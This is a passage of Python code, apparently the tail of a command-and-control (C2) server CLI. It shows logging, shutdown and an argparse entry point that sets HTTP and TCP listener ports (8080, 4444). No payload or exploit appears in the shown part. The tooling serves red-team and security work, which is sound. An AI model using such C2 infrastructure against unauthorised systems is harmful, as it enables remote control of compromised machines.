        self.log("SUCCESS", "Configuration reloaded")
    
    # =========================================================================
    # LOGGING
    # =========================================================================
    
    def log(self, level: str, message: str):
        """Log message to console and database"""
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        level_colors = {
            "ERROR": Colors.RED,
            "WARNING": Colors.YELLOW,
            "SUCCESS": Colors.GREEN,
            "INFO": Colors.CYAN
        }
        color = level_colors.get(level, Colors.WHITE)
        
        print(f"[{Colors.DIM}{timestamp}{Colors.RESET}] {color}[{level}]{Colors.RESET} {message}")
        self.db.log_message(level, message)
    
    def stop(self):
        """Stop the server"""
        self.running = False
        self.http_handler.stop()
        self.tcp_handler.stop()
        self.log("INFO", "Server stopped")

# ============================================================================
# MAIN ENTRY POINT
# ============================================================================

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description="C2 Server CLI")
    parser.add_argument("--http-port", type=int, default=8080, help="HTTP listener port")
    parser.add_argument("--tcp-port", type=int, default=4444, help="TCP listener port")
    parser.add_argument("--db", type=str, default="data/c2_framework.db", help="Database path")
    parser.add_argument("--config", type=str, default="config/c2_config.json", help="Config file")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    
    args = parser.parse_args()
    
    try:
        server = C2ServerCLI()
        
        # Override ports if specified
        server.http_handler.port = args.http_port
        server.tcp_handler.port = args.tcp_port
        
        # Handle Ctrl+C gracefully
        def signal_handler(sig, frame):
            print("\n")
            server.log("INFO", "Shutting down...")
            server.stop()
            sys.exit(0)
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        server.start()
        
    except KeyboardInterrupt:
        print("\n")
        print("[*] Shutting down...")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
